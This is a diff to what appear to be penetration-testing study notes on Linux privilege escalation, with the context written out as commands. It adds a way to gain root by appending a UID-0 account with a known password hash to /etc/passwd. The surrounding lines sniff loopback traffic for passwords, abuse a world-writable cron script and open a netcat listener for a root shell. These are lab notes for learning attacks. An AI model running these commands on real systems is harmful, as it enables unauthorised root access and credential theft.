@@ -1385,7 +1385,7 @@ Reference
   - Use tcpdump to sniff password > user:root,pass:lab  
     `sudo tcpdump -i lo -A | grep "pass"`   
 - insecure file permission > /bin/bash /home/joe/.scripts/user_backups.sh  
-  - inspect cron log file  
+  - **inspect cron log file  **
     `grep "CRON" /var/log/syslog`  
   - inspect content and permisission of script > every user can write the file -rwxrwxrw-  
     `cat /home/joe/.scripts/user_backups.sh`  
@@ -1398,6 +1398,16 @@ Reference
     ```
   - get a root shell from target
     `nc -lnvp 1234`
+  - **/etc/passwd (account) takes precedence over /etc/shadow (password)**  
+  - escalate privilege by editing /etc/passwd  
+    ```
+    openssl passwd w00t
+    echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+    su root2
+    Password: w00t
+    id
+    ```
+  - dd
 - abuse system linux components  
 
 ### 19. Port redirection and SSH tunneling
